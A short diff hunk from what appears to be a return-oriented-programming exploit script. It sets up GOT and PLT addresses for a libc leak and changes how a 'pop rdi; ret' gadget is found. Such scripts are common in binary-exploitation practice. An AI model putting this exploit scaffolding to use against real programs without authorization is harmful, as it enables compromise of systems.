@@ -14,8 +14,9 @@ let got_libc_start = elf.got.__libc_start_main
 let main_addr = elf.symbols.main
 
 # Find gadgets
-let gadgets = quick_rop(binary)
-let pop_rdi = find(gadgets, "pop rdi; ret")
+# quick_rop(binary) prints ROP template - use rop_find() for actual gadgets
+let pop_rdi_list = rop_find(binary, "pop rdi; ret")
+let pop_rdi = pop_rdi_list[0]
 
 print("[*] PLT/GOT addresses:")
 print("    puts@PLT:", hex(plt_puts))
